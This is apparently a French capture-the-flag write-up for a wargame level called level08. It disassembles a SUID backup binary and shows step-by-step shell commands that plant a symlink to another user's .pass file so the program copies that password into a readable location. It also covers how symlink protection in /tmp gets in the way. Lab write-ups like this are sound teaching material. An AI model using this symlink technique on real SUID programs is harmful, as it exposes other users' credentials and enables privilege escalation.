# level08

## 0. Prérequis : Chemins relatifs et liens symboliques

### Chemins relatifs = ancrés sur le répertoire courant (CWD)

Le programme n'utilise que des chemins **relatifs** (`./backups/...`). Un chemin
relatif se résout depuis le **dossier courant** au moment où on lance la
commande. C'est donc **nous** qui décidons où `.` pointe, en choisissant d'où on
lance le binaire.

### Lien symbolique (symlink)

Un symlink est un fichier qui ne contient qu'un **chemin vers une autre cible**.
Quand un programme ouvre le lien, le noyau le **suit** automatiquement et ouvre
la cible — avec les droits du **processus** (ici euid = level09), pas ceux du
lien. Créer un lien ne vérifie **jamais** les permissions de la cible ; seule
l'**ouverture** les vérifie.

```sh
ln -s /home/users/level09/.pass ./secret   # ./secret pointe vers le .pass de level09
```

## 1. Analyse

### Chaînes essentielles (.rodata)

```
0x400d6d  "./backups/.log"      ← fichier de LOG (fopen mode "w"), chemin RELATIF
0x400d6b  "w"
0x400dab  "./backups/"          ← PRÉFIXE ajouté devant argv[1], chemin RELATIF
0x400da9  "r"                   ← mode d'ouverture de argv[1]
0x400d96  "Starting back up: "  ← tag du 1er log
0x400dd2  "Finished back up "   ← tag du 2e log
0x400d7c  "...Failed to open %s" ← message d'erreur des fopen
```

### `main(argc, argv)` — déroulement

```asm
; if (argc != 2) printf("usage...", argv[0]);   ← PAS de exit, on continue
400a4a:  fopen("./backups/.log", "w")  → f1     ; sinon erreur + exit(1)
400aae:  log_wrapper(f1, argv[1], "Starting back up: ")
400ab3:  fopen(argv[1], "r")           → f2     ; ← lu EN level09 ; sinon erreur + exit(1)
         path = "./backups/" + argv[1]          ; strncat borné (99 o.) → pas d'overflow
400b93:  open(path, O_WRONLY|O_CREAT|O_EXCL, 0660)  → fd   ; 0xc1 / 0x1b0 ; sinon erreur + exit
; boucle : while ((c = fgetc(f2)) != 0xff) write(fd, &c, 1);   ← copie f2 → fd
400c22:  log_wrapper(f1, argv[1], "Finished back up ")
         fclose(f2); close(fd);
```

### Résumé

```c
int main(int argc, char **argv) {
    FILE *log = fopen("./backups/.log", "w");       // relatif au CWD
    log_wrapper(log, argv[1], "Starting back up: ");

    FILE *src = fopen(argv[1], "r");                // ← ouvert avec les droits de level09
    char path[~100];
    strcpy(path, "./backups/");
    strncat(path, argv[1], 99 - strlen(path));      // path = "./backups/" + argv[1]

    int fd = open(path, O_WRONLY|O_CREAT|O_EXCL, 0660);  // créé par level09, lisible groupe
    int c;
    while ((c = fgetc(src)) != 0xff) write(fd, &c, 1);   // copie src → path

    log_wrapper(log, argv[1], "Finished back up ");
}
```

## 2. Reconnaissance

### La faille : lecture privilégiée + chemin relatif

Le binaire est **SUID level09**. Donc `fopen(argv[1], "r")` lit **avec les
droits de level09**, et recopie le contenu dans `./backups/<argv[1]>` — fichier
créé **par level09** en mode `0660` (donc lisible par le groupe, donc par nous).

Le point décisif : **`argv[1]` sert à la fois de fichier source à lire ET de
suffixe de la destination.**

- On ne peut pas donner `argv[1] = "/home/users/level09/.pass"` : la **source**
  s'ouvrirait, mais la **destination** deviendrait
  `./backups//home/users/level09/.pass` → `open()` ne crée pas les dossiers
  intermédiaires → échec.
- Solution : `argv[1]` = un **nom simple** (ex. `secret`) pour que la
  destination `./backups/secret` soit valide, et on fait de la **source**
  `./secret` un **symlink** vers `/home/users/level09/.pass`. `fopen` suit le
  lien, level09 lit son propre `.pass`, et le contenu atterrit dans
  `./backups/secret` que l'on peut relire.

## 3. Exploitation

### Piège : protection des symlinks dans `/tmp`

Premier réflexe : tout faire dans `/tmp` **échoue** avec *"Failed to open
secret"*. Raison : `/tmp` est **sticky + world-writable** (`drwxrwxrwt`), et le
noyau applique **`fs.protected_symlinks`** :

> Dans un dossier sticky et world-writable, un lien symbolique n'est suivi que
> si celui qui le suit (euid) en est le **propriétaire**, ou est propriétaire du
> dossier.

Pour `/tmp/secret` : lien possédé par level08, dossier `/tmp` possédé par root,
suiveur = level09. Aucun ne correspond → **le noyau refuse de suivre le lien**.
(Le log, lui, s'écrit quand même : `./backups/.log` n'est pas un symlink.)

**Correction** : travailler dans un sous-dossier **à nous** (non sticky, non
world-writable) par exemple **`/attack`**, où la protection ne s'applique pas.

### Étapes

```sh
mkdir -p /tmp/attack
cd /tmp/attack                               # '.' = /tmp/attack (non sticky)

mkdir -p backups                             # ./backups doit exister (log + destination)
ln -s /home/users/level09/.pass ./secret     # source : symlink vers le .pass de level09

/home/users/level08/level08 secret           # lit "secret" en level09 → copie dans ./backups/secret

cat backups/secret                           # ← mot de passe de level09
```

Puis :

```sh
su level09        # avec le mot de passe récupéré
```

### Détails qui comptent

- **Lancer depuis `/tmp/attack`** : les chemins étant relatifs, `.` doit être ce
  dossier pour que `./secret` et `./backups/` soient trouvés et relisibles.
- **`O_EXCL`** : `./backups/secret` ne doit pas déjà exister. Pour recommencer :
  `rm -rf /tmp/attack` et refaire, ou changer de nom.
- **Mode `0660`** : la copie appartient à level09 mais le bit groupe nous donne
  la lecture.
- **Vérifier le SUID** si ça échoue encore : `ls -l /home/users/level08/level08`
  doit montrer un `s` (`-rwsr-x---`). Sans `s`, le binaire ne tourne pas en
  level09 et c'est une autre piste.
